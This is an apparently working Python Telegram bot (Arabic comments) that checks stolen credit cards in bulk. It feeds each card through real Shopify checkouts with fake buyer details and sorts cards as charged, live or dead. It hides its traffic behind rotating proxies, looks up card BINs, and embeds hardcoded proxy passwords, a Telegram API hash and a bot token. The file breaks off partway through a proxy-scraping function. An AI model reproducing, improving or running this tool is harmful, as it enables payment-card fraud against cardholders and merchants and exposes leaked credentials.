from telethon import TelegramClient, events, Button
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
import httpx
from datetime import datetime
from urllib.parse import quote
from fake_useragent import UserAgent
from collections import deque
from asyncio import Semaphore

# ==================== دوال الفحص المتطورة ====================

def parse_proxy_ultimate(proxy_str: str):
    """تحليل البروكسي بأي صيغة"""
    if not proxy_str:
        return None
    
    proxy_str = proxy_str.strip()
    proxy_type = 'http'
    
    protocol_match = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy_str, re.IGNORECASE)
    if protocol_match:
        proxy_type = protocol_match.group(1).lower()
        proxy_str = protocol_match.group(2)
    
    host = ''
    port = ''
    username = ''
    password = ''
    
    match = re.match(r'^([^:@]+):([^@]+)@([^:@]+):(\d+)$', proxy_str)
    if match:
        username, password, host, port = match.groups()
    elif re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy_str):
        host, port, username, password = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy_str).groups()
    elif re.match(r'^([^:@]+):(\d+)$', proxy_str):
        host, port = re.match(r'^([^:@]+):(\d+)$', proxy_str).groups()
    else:
        return None
    
    if not host or not port:
        return None
    
    if username and password:
        user_encoded = quote(username, safe='')
        pass_encoded = quote(password, safe='')
        return f'http://{user_encoded}:{pass_encoded}@{host}:{port}'
    else:
        return f'http://{host}:{port}'

# ==================== مدير البروكسيات الذكي ====================

class SmartProxyManager:
    """مدير بروكسيات ذكي مع بروكسي رئيسي دوّار وآخر احتياطي"""
    
    def __init__(self):
        # البروكسي الرئيسي (يتغير IP تلقائياً)
        self.main_proxy = "http://iEN2jEvl:5TqD95Nm664K@proxy.taquito.pp.ua:8080"
        # البروكسي الاحتياطي الثابت
        self.backup_proxy = "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@ca-mon.pvdata.host:8080"
        
        self.current_proxy = self.main_proxy
        self.current_type = "main"
        self.fallback_mode = False
        self.last_error_count = 0
        self.max_errors_before_fallback = 3
        
    def get_current_proxy(self):
        """إرجاع البروكسي الحالي"""
        return self.current_proxy
    
    def get_current_type(self):
        """إرجاع نوع البروكسي الحالي ('main' أو 'backup')"""
        return self.current_type
    
    def report_error(self):
        """تسجيل خطأ عند فشل البروكسي"""
        self.last_error_count += 1
        if self.last_error_count >= self.max_errors_before_fallback and not self.fallback_mode:
            self.switch_to_next_proxy()
    
    def report_success(self):
        """تسجيل نجاح - إعادة تعيين عداد الأخطاء"""
        self.last_error_count = 0
        # إذا كنا في وضع الاحتياطي وحصل نجاح، نرجع للرئيسي
        if self.fallback_mode:
            self.switch_to_main_proxy()
    
    def switch_to_next_proxy(self):
        """التبديل إلى البروكسي التالي (من رئيسي إلى احتياطي أو العكس)"""
        if self.current_type == "main":
            self.current_proxy = self.backup_proxy
            self.current_type = "backup"
            self.fallback_mode = True
            print(f"🔄 [Proxy Manager] Switched to BACKUP proxy: {self.current_proxy[:50]}...")
        else:
            # إذا كنا في الاحتياطي، نحاول العودة للرئيسي بعد فترة
            self.current_proxy = self.main_proxy
            self.current_type = "main"
            self.fallback_mode = False
            print(f"🔄 [Proxy Manager] Switched back to MAIN proxy: {self.current_proxy[:50]}...")
        
        self.last_error_count = 0
    
    def switch_to_main_proxy(self):
        """التبديل إلى البروكسي الرئيسي"""
        if self.current_type != "main":
            self.current_proxy = self.main_proxy
            self.current_type = "main"
            self.fallback_mode = False
            self.last_error_count = 0
            print(f"🔄 [Proxy Manager] Switched to MAIN proxy: {self.current_proxy[:50]}...")
    
    def get_status(self):
        """الحصول على حالة المدير"""
        return {
            'current_type': self.current_type,
            'current_proxy': self.current_proxy,
            'fallback_mode': self.fallback_mode,
            'error_count': self.last_error_count
        }

# إنشاء نسخة عالمية من مدير البروكسيات الذكي
smart_proxy_manager = SmartProxyManager()

def get_current_proxy():
    """دالة مساعدة لإرجاع البروكسي الحالي من المدير الذكي"""
    return smart_proxy_manager.get_current_proxy()

class ShopifyCheckerDirect:
    """فحص Shopify متطور"""
    
    def __init__(self, proxy: str = None):
        self.ua = UserAgent()
        self.proxy = proxy
        # إذا لم يتم تحديد بروكسي، استخدم البروكسي من المدير الذكي
        if not self.proxy:
            self.proxy = smart_proxy_manager.get_current_proxy()
    
    async def get_best_product(self, session: httpx.AsyncClient, site: str):
        """جلب أرخص منتج متاح للفحص"""
        urls_to_try = [f"{site}/products.json", f"{site}/collections/all/products.json"]
        cheapest_product = None
        cheapest_price = float('inf')
        
        for base_url in urls_to_try:
            page = 1
            while page <= 5:
                url = f"{base_url}?page={page}&limit=250"
                try:
                    response = await session.get(url)
                    if response.status_code != 200:
                        break
                    
                    data = response.json()
                    products = data.get('products', [])
                    if not products:
                        break
                    
                    for product in products:
                        for variant in product.get('variants', []):
                            if variant.get('available', False):
                                try:
                                    price = float(variant.get('price', 100))
                                    # جلب أرخص منتج
                                    if price < cheapest_price:
                                        cheapest_price = price
                                        cheapest_product = {
                                            'id': str(variant['id']),
                                            'title': product.get('title', 'Product'),
                                            'price': str(int(price * 100)),
                                            'price_value': price
                                        }
                                except:
                                    pass
                    
                    if len(products) < 250:
                        break
                    page += 1
                except:
                    page += 1
        
        if cheapest_product:
            return cheapest_product
        
        # إذا ما لقينا منتج، نجيب أي منتج متاح
        return await self.get_cheapest_product(session, site)
    
    async def get_cheapest_product(self, session: httpx.AsyncClient, site: str):
        """جلب أرخص منتج (احتياطي)"""
        urls_to_try = [f"{site}/products.json", f"{site}/collections/all/products.json"]
        
        for base_url in urls_to_try:
            page = 1
            while page <= 10:
                url = f"{base_url}?page={page}&limit=250"
                try:
                    response = await session.get(url)
                    if response.status_code != 200:
                        break
                    
                    data = response.json()
                    products = data.get('products', [])
                    if not products:
                        break
                    
                    for product in products:
                        for variant in product.get('variants', []):
                            if variant.get('available', False):
                                try:
                                    price = float(variant.get('price', 100))
                                    return {
                                        'id': str(variant['id']),
                                        'title': product.get('title', 'Product'),
                                        'price': str(int(price * 100)),
                                        'price_value': price
                                    }
                                except:
                                    pass
                    
                    if len(products) < 250:
                        break
                    page += 1
                except:
                    page += 1
        return None
    
    async def extract_checkout_tokens(self, html: str):
        """استخراج التوكنات من صفحة الدفع"""
        tokens = {}
        
        session_patterns = [
            r'session-token" content="([^"]+)"',
            r'"sessionToken":"([^"]+)"',
            r'data-checkout-session-token="([^"]+)"',
        ]
        for pattern in session_patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                tokens['session_token'] = match.group(1)
                break
        if 'session_token' not in tokens:
            tokens['session_token'] = ""
        
        queue_patterns = [r'"queueToken":"([^"]+)"', r'data-queue-token="([^"]+)"']
        for pattern in queue_patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                tokens['queue_token'] = match.group(1)
                break
        if 'queue_token' not in tokens:
            tokens['queue_token'] = ""
        
        stable_patterns = [r'stableId["\']?\s*:\s*["\']([^"\']+)["\']']
        for pattern in stable_patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                tokens['stable_id'] = match.group(1)
                break
        if 'stable_id' not in tokens:
            tokens['stable_id'] = ""
        
        payment_patterns = [r'paymentMethodIdentifier["\']?\s*:\s*["\']([^"\']+)["\']']
        for pattern in payment_patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                tokens['payment_id'] = match.group(1)
                break
        if 'payment_id' not in tokens:
            tokens['payment_id'] = ""
        
        total_patterns = [r'"totalPrice"\s*:\s*{\s*"amount"\s*:\s*"(\d+)"']
        for pattern in total_patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                tokens['updated_total'] = match.group(1)
                break
        if 'updated_total' not in tokens:
            tokens['updated_total'] = ""
        
        return tokens
    
    async def get_random_info(self):
        """معلومات عشوائية متطورة"""
        first_names = ["John", "Emily", "Michael", "Jessica", "David", "Sarah", "James", "Lisa", "Robert", "Jennifer"]
        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
        addresses = [
            "123 Main St", "456 Oak Ave", "789 Pine Rd", "321 Elm St", 
            "654 Maple Dr", "987 Cedar Ln", "147 Birch St", "258 Walnut Ave"
        ]
        cities = ["Portland", "Bangor", "Lewiston", "Augusta", "Portland", "South Portland"]
        
        return {
            "first": random.choice(first_names),
            "last": random.choice(last_names),
            "email": f"{random.choice(first_names).lower()}.{random.choice(last_names).lower()}{random.randint(1,9999)}@gmail.com",
            "phone": random.choice(["2025550199", "3105551234", "4155559876", "6175550123", "9718081573", "2125559999"]),
            "address": random.choice(addresses),
            "city": random.choice(cities),
            "state": random.choice(["ME", "MA", "NY", "CA", "TX", "FL"]),
            "zip": random.choice(["04101", "04102", "04103", "04240", "04401", "02108", "10001", "90210"])
        }
    
    async def process_card(self, site: str, card: str):
        """الفحص الأساسي المتطور"""
        try:
            parts = card.split('|')
            if len(parts) != 4:
                return {"status": "error", "message": "Invalid card format", "price": None}
            
            cc_num, month, year, cvv = parts
            if len(year) == 4:
                year = year[2:]
            
            # التحقق من صلاحية البطاقة
            from datetime import datetime
            now = datetime.now()
            exp_year = int(year)
            if exp_year < 100:
                exp_year += 2000
            exp_month = int(month)
            if exp_year < now.year or (exp_year == now.year and exp_month < now.month):
                return {"status": "declined", "message": f"Card expired ({month}/{year})", "price": None}
            
            client_kwargs = {
                'timeout': 45.0,
                'follow_redirects': True,
                'verify': False,
                'headers': {'User-Agent': self.ua.random}
            }
            if self.proxy:
                parsed = parse_proxy_ultimate(self.proxy)
                if parsed:
                    client_kwargs['proxy'] = parsed
            
            async with httpx.AsyncClient(**client_kwargs) as session:
                # جلب أفضل منتج (أرخص منتج)
                product = await self.get_best_product(session, site)
                if not product:
                    return {"status": "declined", "message": "No products found", "price": None}
                
                # إضافة للسلة
                resp = await session.post(
                    f"{site}/cart/add.js",
                    data={'id': product['id'], 'quantity': 1},
                    headers={'Content-Type': 'application/x-www-form-urlencoded'}
                )
                if resp.status_code not in [200, 201, 302]:
                    return {"status": "error", "message": f"Failed to add to cart: {resp.status_code}", "price": product['price']}
                
                # جلب معلومات السلة
                resp = await session.get(f"{site}/cart.js")
                if resp.status_code != 200:
                    return {"status": "error", "message": "Failed to get cart", "price": product['price']}
                
                cart = resp.json()
                cart_token = cart.get('token')
                
                # الدخول للدفع
                resp = await session.get(f"{site}/checkout")
                if resp.status_code != 200:
                    return {"status": "error", "message": "Failed to access checkout", "price": product['price']}
                
                # استخراج التوكنات
                tokens = await self.extract_checkout_tokens(resp.text)
                
                if not tokens.get('session_token'):
                    return {"status": "error", "message": "No session token", "price": product['price']}
                
                user = await self.get_random_info()
                
                # إنشاء جلسة دفع
                payment_data = {
                    'credit_card': {
                        'number': cc_num,
                        'month': month,
                        'year': year,
                        'verification_value': cvv,
                        'name': f"{user['first']} {user['last']}"
                    },
                    'payment_session_scope': site.replace('https://', '').split('/')[0]
                }
                
                resp = await session.post(
                    'https://deposit.us.shopifycs.com/sessions',
                    json=payment_data,
                    headers={'Content-Type': 'application/json'}
                )
                
                if resp.status_code != 200:
                    return {"status": "declined", "message": "Payment session failed", "price": product['price']}
                
                payment_session = resp.json()
                session_id = payment_session.get('id')
                
                if not session_id:
                    error = payment_session.get('error', {}).get('message', '')
                    if 'declined' in error.lower():
                        return {"status": "declined", "message": f"Declined - {error}", "price": product['price']}
                    return {"status": "declined", "message": "Card declined", "price": product['price']}
                
                # GraphQL mutation
                graphql_url = f"{site}/checkouts/unstable/graphql"
                graphql_payload = {
                    'operationName': 'SubmitForCompletion',
                    'query': '''
                        mutation SubmitForCompletion($input: NegotiationInput!, $attemptToken: String!) {
                            submitForCompletion(input: $input, attemptToken: $attemptToken) {
                                __typename
                                ... on SubmitSuccess {
                                    receipt { id token }
                                }
                                ... on SubmitFailed { reason }
                                ... on Throttled { pollAfter queueToken }
                            }
                        }
                    ''',
                    'variables': {
                        'input': {
                            'sessionInput': {'sessionToken': tokens['session_token']},
                            'queueToken': tokens.get('queue_token'),
                            'delivery': {
                                'deliveryLines': [{
                                    'targetMerchandiseLines': {
                                        'lines': [{'stableId': tokens.get('stable_id')}]
                                    },
                                    'destination': {
                                        'streetAddress': {
                                            'address1': user['address'],
                                            'city': user['city'],
                                            'countryCode': 'US',
                                            'postalCode': user['zip'],
                                            'firstName': user['first'],
                                            'lastName': user['last'],
                                            'phone': user['phone']
                                        }
                                    }
                                }]
                            },
                            'payment': {
                                'paymentLines': [{
                                    'paymentMethod': {
                                        'directPaymentMethod': {
                                            'paymentMethodIdentifier': tokens.get('payment_id'),
                                            'sessionId': session_id,
                                            'billingAddress': {
                                                'streetAddress': {
                                                    'address1': user['address'],
                                                    'city': user['city'],
                                                    'countryCode': 'US',
                                                    'postalCode': user['zip'],
                                                    'firstName': user['first'],
                                                    'lastName': user['last'],
                                                    'phone': user['phone']
                                                }
                                            }
                                        }
                                    }
                                }]
                            },
                            'buyerIdentity': {
                                'buyerIdentity': {
                                    'presentmentCurrency': 'USD',
                                    'countryCode': 'US'
                                },
                                'contactInfoV2': {
                                    'emailOrSms': {'value': user['email']}
                                }
                            }
                        },
                        'attemptToken': f"{cart_token}-{random.random()}"
                    }
                }
                
                headers = {
                    'User-Agent': self.ua.random,
                    'X-Checkout-One-Session-Token': tokens['session_token'],
                    'Content-Type': 'application/json'
                }
                
                resp = await session.post(graphql_url, json=graphql_payload, headers=headers)
                
                if resp.status_code != 200:
                    return {"status": "error", "message": "GraphQL failed", "price": product['price']}
                
                result = resp.json()
                
                if 'data' in result and result['data'].get('submitForCompletion'):
                    completion = result['data']['submitForCompletion']
                    
                    if completion.get('__typename') == 'SubmitSuccess':
                        receipt = completion.get('receipt', {})
                        if receipt.get('id'):
                            return {"status": "charged", "message": "CHARGED! Order confirmed", "price": product['price']}
                        return {"status": "charged", "message": "CHARGED!", "price": product['price']}
                    
                    elif completion.get('__typename') == 'SubmitFailed':
                        reason = completion.get('reason', '')
                        if 'insufficient' in reason.lower():
                            return {"status": "approved", "message": "APPROVED - Insufficient funds", "price": product['price']}
                        elif 'cvv' in reason.lower() or 'cvc' in reason.lower():
                            return {"status": "approved", "message": "APPROVED - Invalid CVV", "price": product['price']}
                        elif 'declined' in reason.lower():
                            return {"status": "declined", "message": "DECLINED", "price": product['price']}
                    
                    elif completion.get('__typename') == 'Throttled':
                        return {"status": "approved", "message": "APPROVED - Processing", "price": product['price']}
                
                # فحص الصفحة النهائية
                checkout_final = await session.get(f"{site}/checkout?from_processing_page=1&validate=true", follow_redirects=True)
                final_text = checkout_final.text.lower()
                
                if "thank you" in final_text or "order confirmed" in final_text:
                    return {"status": "charged", "message": "CHARGED! Order confirmed", "price": product['price']}
                elif "insufficient funds" in final_text:
                    return {"status": "approved", "message": "APPROVED - Insufficient funds", "price": product['price']}
                elif "declined" in final_text:
                    return {"status": "declined", "message": "DECLINED", "price": product['price']}
                
                return {"status": "unknown", "message": "Unknown response", "price": product['price']}
                
        except Exception as e:
            return {"status": "error", "message": str(e), "price": None}
# ==================== إعدادات البوت ====================

PREMIUM_EMOJI_IDS = {
    "✅": "6023660820544623088",
    "🔥": "5999340396432333728",
    "❌": "6037570896766438989",
    "⚡": "6026367225466720832",
    "💳": "5971944878815317190",
    "💠": "5971837723676249096",
    "📝": "6023660820544623088",
    "🌐": "6026367225466720832",
    "🎯": "5974235702701853774",
    "🤖": "6057466460886799210",
    "🤵": "4949560993840629085",
    "💰": "5971944878815317190",
    "⏸️": "6001440193058444284",
    "▶️": "6285315214673975495",
    "🛑": "5420323339723881652",
    "📊": "5971837723676249096",
    "📦": "6066395745139824604",
    "📋": "5974235702701853774",
    "🔄": "5971837723676249096",
    "⏳": "5971837723676249096",
    "🚀": "6282977077427702833",
    "⚠️": "5420323339723881652",
    "💎": "6023660820544623088",
}

def premium_emoji(text):
    if not text:
        return text
    placeholders = []
    result = text
    for i, (emoji, doc_id) in enumerate(PREMIUM_EMOJI_IDS.items()):
        placeholder = f"\x00PE{i:02d}\x00"
        placeholders.append((placeholder, doc_id, emoji))
        result = result.replace(emoji, placeholder)
    for placeholder, doc_id, emoji in placeholders:
        result = result.replace(placeholder, f'<tg-emoji emoji-id="{doc_id}">{emoji}</tg-emoji>')
    return result

API_ID = 28095409
API_HASH = '5883d21dcb98154b67960e96dc2a690e'
BOT_TOKEN = '8558756991:AAF6yyZ_MiNH-_H5cBGogx7vuLGVBUZODYQ'

SITES_FILE = 'sites.txt'
PROXY_FILE = 'proxy.txt'
CACHE_FILE = 'cache.json'

bot = TelegramClient('checker_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
active_sessions = {}
site_cache = {}  # تخزين مؤقت للمواقع الشغالة

_DEAD_INDICATORS = (
    'receipt id is empty', 'handle is empty', 'cloudflare', 
    'connection failed', 'timed out', 'access denied', 
    'ssl routines', 'could not resolve', 'domain name not found',
    'timeout', 'unreachable', 'ssl error', '502', '503', '504',
    'gateway timeout', 'network error', 'connection reset',
    'captcha required', 'site dead', 'failed', 'no products found'
)

def get_file_lines(filepath):
    if not os.path.exists(filepath):
        return []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception:
        return []

def load_sites():
    return get_file_lines(SITES_FILE)

def load_proxies():
    return get_file_lines(PROXY_FILE)

def save_cache():
    """حفظ الكاش"""
    try:
        with open(CACHE_FILE, 'w') as f:
            json.dump(site_cache, f)
    except:
        pass

def load_cache():
    """تحميل الكاش"""
    global site_cache
    try:
        if os.path.exists(CACHE_FILE):
            with open(CACHE_FILE, 'r') as f:
                site_cache = json.load(f)
    except:
        site_cache = {}

def is_premium(user_id):
    return True

def extract_cc(text):
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    cards = []
    for match in matches:
        card, month, year, cvv = match
        if len(year) == 2:
            year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

def is_dead_site_error(error_msg):
    if not error_msg:
        return True
    error_lower = str(error_msg).lower()
    return any(keyword in error_lower for keyword in _DEAD_INDICATORS)

async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as res:
                if res.status != 200:
                    return 'BIN Info Not Found', '-', '-', '-', '-', ''
                data = await res.json()
                brand = data.get('brand', '-')
                bin_type = data.get('type', '-')
                level = data.get('level', '-')
                bank = data.get('bank', '-')
                country = data.get('country_name', '-')
                flag = data.get('country_flag', '')
                return brand, bin_type, level, bank, country, flag
    except:
        return '-', '-', '-', '-', '-', ''

async def check_card_direct(card, site, proxy):
    """الفحص المباشر - معدل لاستخدام المدير الذكي"""
    try:
        # استخدم البروكسي من المدير الذكي إذا لم يتم تمرير بروكسي
        if not proxy:
            proxy = smart_proxy_manager.get_current_proxy()
        
        site_url = f'https://{site}'
        checker = ShopifyCheckerDirect(proxy=proxy)
        result = await checker.process_card(site_url, card)
        
        status_map = {
            'charged': 'Charged',
            'approved': 'Approved',
            'declined': 'Dead',
            'error': 'Site Error',
            'unknown': 'Dead'
        }
        
        # إذا كان الخطأ بسبب البروكسي، سجل في المدير الذكي
        if result['status'] in ['error', 'unknown'] and any(x in str(result.get('message', '')).lower() for x in ['timeout', 'connection', 'proxy', 'ssl']):
            smart_proxy_manager.report_error()
        else:
            smart_proxy_manager.report_success()
        
        if is_dead_site_error(result.get('message', '')):
            return {
                'status': 'Site Error',
                'message': result.get('message', 'Site error'),
                'card': card,
                'retry': True,
                'gateway': 'Shopify',
                'price': result.get('price', '-')
            }
        
        return {
            'status': status_map.get(result['status'], 'Dead'),
            'message': result.get('message', 'Unknown'),
            'card': card,
            'site': site,
            'gateway': 'Shopify',
            'price': result.get('price', '-'),
            'retry': result['status'] == 'error'
        }
        
    except Exception as e:
        error_msg = str(e).lower()
        if any(x in error_msg for x in ['timeout', 'connection', 'proxy', 'ssl']):
            smart_proxy_manager.report_error()
        
        return {
            'status': 'Site Error' if 'timeout' in error_msg else 'Dead',
            'message': str(e),
            'card': card,
            'gateway': 'Unknown',
            'price': '-',
            'retry': 'timeout' in error_msg
        }

async def check_card_with_retry(card, sites, proxies, max_retries=2):
    """فحص بطاقة مع إعادة المحاولة"""
    last_result = None
    if not sites:
        return {'status': 'Dead', 'message': 'No sites available', 'card': card, 'gateway': 'Unknown', 'price': '-'}
    if not proxies:
        return {'status': 'Dead', 'message': 'No proxies available', 'card': card, 'gateway': 'Unknown', 'price': '-'}

    for attempt in range(max_retries):
        site = random.choice(sites)
        proxy = random.choice(proxies)
        result = await check_card_direct(card, site, proxy)

        if not result.get('retry'):
            return result

        last_result = result
        if attempt < max_retries - 1:
            await asyncio.sleep(0.3)

    if last_result:
        return {'status': 'Dead', 'message': f'Site errors: {last_result["message"][:50]}', 'card': card, 'gateway': last_result.get('gateway', 'Unknown'), 'price': last_result.get('price', '-'), 'site': 'Multiple'}

    return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': 'Unknown', 'price': '-'}

# ==================== دوال البوت ====================

async def send_realtime_hit(user_id, result, hit_type, username):
    emoji = "✅" if hit_type == "Charged" else "🔥"
    status_text = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝" if hit_type == "Charged" else "𝐋𝐢𝐯𝐞"
    brand, bin_type, level, bank, country, flag = await get_bin_info(result['card'].split('|')[0])
    
    message = f"""<b>⚡💳 ㅤ#𝒮𝒽𝑜𝓅𝒾𝒾𝒾  💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐇𝐢𝐭 𝐅𝐨𝐮𝐧𝐝!</b>
<blockquote>{emoji} Status: {status_text}</blockquote>
<blockquote>💳 Card: <code>{result['card']}</code></blockquote>
<blockquote>📝 Response: {result['message'][:150]}</blockquote>
<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {result.get('gateway', 'Unknown')} | 💰 {result.get('price', '-')}</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>🎯💠 𝐁𝐈𝐍 𝐈𝐧𝐟𝐨</b>
<pre>𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}</pre>
<b>━━━━━━━━━━━━━━━━━</b>
🤖 <b>Bot By: Mustafa 🔥</b>"""
    try:
        await bot.send_message(user_id, premium_emoji(message), parse_mode='html')
    except:
        pass

async def update_progress(user_id, message_id, results, current_attempt_count):
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60
    remaining = results['total'] - current_attempt_count
    speed = current_attempt_count / max(elapsed, 1)
    eta_seconds = int(remaining / max(speed, 0.1))
    eta_minutes = eta_seconds // 60
    eta_seconds = eta_seconds % 60
    
    gateway = results['charged'][0]['gateway'] if results['charged'] else (results['approved'][0]['gateway'] if results['approved'] else 'Shopify')
    progress_text = f"""<b>⚡💳 ㅤ#𝒮𝒽𝑜𝓅𝒾𝒾𝒾  💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐏𝐫𝐨𝐠𝐫𝐞𝐬𝐬</b>
<blockquote>💳 Total: {results['total']} | ✅ Charged: {len(results['charged'])} | 🔥 Live: {len(results['approved'])} | ❌ Dead: {len(results['dead'])}</blockquote>
<blockquote>📊 Checked: {current_attempt_count}/{results['total']} ({int(current_attempt_count/results['total']*100)}%)</blockquote>
<blockquote>⚡ Speed: {speed:.1f} cards/sec</blockquote>
<blockquote>⏱️ Elapsed: {hours}h {minutes}m {seconds}s | ETA: {eta_minutes}m {eta_seconds}s</blockquote>
<blockquote>🌐 Gateway: 🔥 {gateway}</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>"""
    buttons = [[Button.inline("⏸️ Pause", b"pause"), Button.inline("▶️ Resume", b"resume")], [Button.inline("🛑 Stop", b"stop")]]
    try:
        await bot.edit_message(user_id, message_id, premium_emoji(progress_text), buttons=buttons, parse_mode='html')
    except:
        pass

async def send_final_results(user_id, results):
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60
    hits_text = ""
    if results['charged']:
        for r in results['charged'][:10]:
            hits_text += f"✅ <code>{r['card']}</code>\n"
    if results['approved']:
        for r in results['approved'][:10]:
            hits_text += f"🔥 <code>{r['card']}</code>\n"
    if not hits_text:
        hits_text = "No hits found"
    gateway = results['charged'][0]['gateway'] if results['charged'] else (results['approved'][0]['gateway'] if results['approved'] else 'Shopify')
    summary = f"""<b>⚡💳 ㅤ#𝒮𝒽𝑜𝓅𝒾𝒾𝒾  💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐑𝐞𝐬𝐮𝐥𝐭𝐬</b>
<blockquote>💳 Total: {results['total']} | ✅ Charged: {len(results['charged'])} | 🔥 Live: {len(results['approved'])} | ❌ Dead: {len(results['dead'])}</blockquote>
<blockquote>⚡ Speed: {(results['total']/max(elapsed,1)):.1f} cards/sec</blockquote>
<blockquote>⏱️ Time: {hours}h {minutes}m {seconds}s</blockquote>
<blockquote>🌐 Gateway: 🔥 {gateway}</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>🎯💠 𝐇𝐢𝐭𝐬</b>
<blockquote>{hits_text}</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
🤖 <b>Bot By: Mustafa 🔥</b>"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"Mustafa_{user_id}_{timestamp}.txt"
    async with aiofiles.open(filename, 'w') as f:
        await f.write("=" * 70 + "\n")
        await f.write("⚡💳 CC CHECKER RESULTS 💳⚡\n")
        await f.write("=" * 70 + "\n\n")
        await f.write(f"✅ CHARGED ({len(results['charged'])}):\n")
        for r in results['charged']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Shopify')} | {r.get('price', '-')} | {r['message'][:100]} | {r.get('site', 'Unknown')}\n")
        await f.write(f"\n🔥 APPROVED ({len(results['approved'])}):\n")
        for r in results['approved']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Shopify')} | {r.get('price', '-')} | {r['message'][:100]} | {r.get('site', 'Unknown')}\n")
        await f.write(f"\n❌ DEAD ({len(results['dead'])}):\n")
        for r in results['dead']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Shopify')} | {r.get('price', '-')} | {r['message'][:100]} | {r.get('site', 'Unknown')}\n")
    await bot.send_message(user_id, premium_emoji(summary), file=filename, parse_mode='html')
    try:
        os.remove(filename)
    except:
        pass

# ==================== اختبار البروكسي والموقع المتطور ====================

async def test_proxy_direct(proxy):
    """اختبار بروكسي مباشر - معدل لدعم المدير الذكي"""
    # إذا لم يتم تمرير بروكسي، استخدم من المدير
    if not proxy:
        proxy = smart_proxy_manager.get_current_proxy()
    
    try:
        parsed = parse_proxy_ultimate(proxy)
        if not parsed:
            smart_proxy_manager.report_error()
            return False
        async with httpx.AsyncClient(proxy=parsed, timeout=15, verify=False) as session:
            resp = await session.get('https://api.ipify.org?format=json')
            if resp.status_code == 200:
                smart_proxy_manager.report_success()
                return True
        smart_proxy_manager.report_error()
        return False
    except:
        smart_proxy_manager.report_error()
        return False

async def test_site_complete(site, proxy):
    """اختبار موقع كامل - منتجات + سلة شراء - معدل لدعم المدير الذكي"""
    try:
        # استخدم البروكسي من المدير الذكي إذا لم يتم تمرير بروكسي
        if not proxy:
            proxy = smart_proxy_manager.get_current_proxy()
        
        site_url = f'https://{site}'
        parsed = parse_proxy_ultimate(proxy)
        
        client_kwargs = {'timeout': 20, 'follow_redirects': True, 'verify': False}
        if parsed:
            client_kwargs['proxy'] = parsed
        
        async with httpx.AsyncClient(**client_kwargs) as session:
            # 1. جلب المنتجات
            resp = await session.get(f"{site_url}/products.json?limit=5")
            if resp.status_code != 200:
                return False, "No products endpoint"
            
            data = resp.json()
            products = data.get('products', [])
            if not products:
                return False, "No products found"
            
            # 2. البحث عن أرخص منتج متاح
            variant_id = None
            product_title = None
            cheapest_price = float('inf')
            for product in products:
                for variant in product.get('variants', []):
                    if variant.get('available', True):
                        try:
                            price = float(variant.get('price', 100))
                            if price < cheapest_price:
                                cheapest_price = price
                                variant_id = str(variant.get('id'))
                                product_title = product.get('title', 'Product')
                        except:
                            if not variant_id:
                                variant_id = str(variant.get('id'))
                                product_title = product.get('title', 'Product')
            
            if not variant_id:
                return False, "No available variants"
            
            # 3. محاولة إضافة للسلة
            add_resp = await session.post(
                f"{site_url}/cart/add.js",
                data={'id': variant_id, 'quantity': 1},
                headers={'Content-Type': 'application/x-www-form-urlencoded'}
            )
            
            if add_resp.status_code in [200, 201, 302]:
                smart_proxy_manager.report_success()
                return True, f"Working - {product_title} (${cheapest_price:.2f})"
            else:
                return False, f"Cart failed (status {add_resp.status_code})"
            
    except Exception as e:
        error_msg = str(e).lower()
        if any(x in error_msg for x in ['timeout', 'connection', 'proxy', 'ssl']):
            smart_proxy_manager.report_error()
        return False, str(e)[:50]

async def add_free_proxies_direct():
    """إضافة بروكسيات مجانية"""
    proxy_sources = [
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    ]
    
    new_proxies = []
    for source in proxy_sources:
        try:
            timeout = aiohttp.ClientTimeout(total=15)
